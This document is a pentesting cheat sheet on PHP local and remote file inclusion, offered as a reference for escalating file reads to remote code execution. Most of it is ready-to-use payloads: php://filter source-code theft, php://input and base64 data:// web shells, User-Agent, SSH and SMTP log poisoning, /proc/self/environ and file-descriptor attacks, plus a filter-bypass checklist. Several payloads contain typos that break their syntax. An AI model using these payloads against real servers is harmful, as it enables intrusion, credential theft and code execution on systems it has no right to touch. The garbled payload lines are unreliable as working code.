# Local/Remote File Inclusion (LFI/RFI)

## Description

Occurs when an application dynamically includes local (LFI) or remote (RFI) files without sanitizing user input.

* **LFI:** Allows you to read sensitive files from the server (ex. `/etc/passwd`, source code).

* **RFI:** Allows loading and executing a script hosted on an external server controlled by the attacker (Requires `allow_url_include = On` in PHP).

* **The Final Objective:** Scale an LFI from simple file reading to **RCE (Remote Code Execution)**.

---

## PHP Wrappers Abuse

When the application uses functions like `include()`, `require()`, or `file_getcontents()` in PHP, we can use native "wrappers" of the language to manipulate how the file is read or executed.

### 1. `php://filter` (Source Code Theft)

If you try to LFI to `index.php`, the server will execute it and you will just see the normal page. To steal the source code (and view database credentials), we force PHP to Base64 encode it before displaying it:

* **Payload:** `?page=php://filter/read=convert.base64-encode/resource=config.php`* *(Decode the resulting Base64 in your terminal to see the source code)*


### 2. `php://input` (LFI to RCE direct)

If `allow_url_include` is on, this wrapper takes everything you send in the body of a POST request and executes it as PHP code.

* **URL:** `?page=php://input`

* **POST Body:** `<?php system('id):?>`

### 3. `data://` (RCE via URL)

Similar to the previous one, but we pass the malicious code directly in the URL, Base64 encode to avoid filters.

* **Payload Base:** `<?phpsystem($_GET['cmd]):?>` -> Base64: `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`

* **url:** `?PAGE=DATA://TEXT/PLAIN;BASE64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id`

---

## LFI to RCE: Log Poisoning

If wrappers are blocked, we can inject malicious PHP code into system log files. Since the LFI allows us to read any file, if we read a "poisoned" log, the server will execute our code when processing the file.

### 1. Apache/Nginx (HTTP Logs)

Web servers record the `User-Agent` of each request.

1. You make a request to the server using Netcat, Burp or curl and inject PHP into the User-Agent: `curl -A "<?php system($_GET['cmd']);?>" http://target.com`

2. You use the LFI to include the log file and pass your command: `?page=/var/log/apache2/access.log&cmd=whoami` *(Common paths: `/var/log/nginx/access.log`, `/var/log/httpd/access.log`)*


### 2. SSH Log Poisoning

If the SSH port (22) is exposed, failed login attempts are saved in the Linux authentication log.

1. You try to log in via SSH using PHP code as the username: `ssh'<?php system($_GET["cmd"]);?>'@target.com`

2. You use the LFI to include the authentication log: `?page=/var/log/auth.log$cmd=id`

### 3. SMTP (Mail) Log Poisoning

Yes you can send an email to the internal server (ex. port 25 open).

1. You connect by telnet: `telnet target.com 25`

2. You send an email to an internal user (ex. www-data or root) with the payload in the subject or body.

3. You use the LFI to read the user's inbox: `?page=/var/mail/www-data&cmd=Is`

---

## Advanced Exploitation: '/proc/' and Descriptors

On Linux, the virtual file system '/proc/' contains real-time information about processes.

### 1. `/proc/self/environ` poisoning 

This file contains the environment variables of the current process running PHP. Often the HTTP `User-Agent` is saved there.

1. Change you User-Agent to: `<?php system($_GET['cmd']);?>`
2. You do the LFI pointing to the proceess environment: `?page=/proc/self/environ&cmd=whoami`

### 2. File Descriptors (`/proc/self/fd/`)

Sometimes you don't know where the logs are or you don't have permissions to read `/var/log/`. Linux maintains file descriptors in `/proc/self/fd/[number]` (0 to 50).
* If the server opens a log file or session file, it is assigned a number (ex. `/proc/self/fd/8`).
* You can poison the log (like in Apache) and the brute force (burp/ffuf fuzz) the LFI from `/proc/self/fd/1` to `50` until you fin the open descriptor and you RCE runs.

---

## EXplotation Checklist

- [] Confirm LFI by trying to read `/etc/passwd` or `C:\Windows\win.ini`.
- [] Try to bypass filters with Null Byte (`%00`), double URL encoding, or Path Truncation (`/etc/passwd/././././`).
- [] Try extracting source code with `php://filter`.
- [] Check if `php://input` or `data://` execute code (for immediate RCE).
- [] Locate log paths (Apache, Nginx SSH) to try Log Poisoning.
- [] Try `/proc/self/environ` if logs are not accessible.


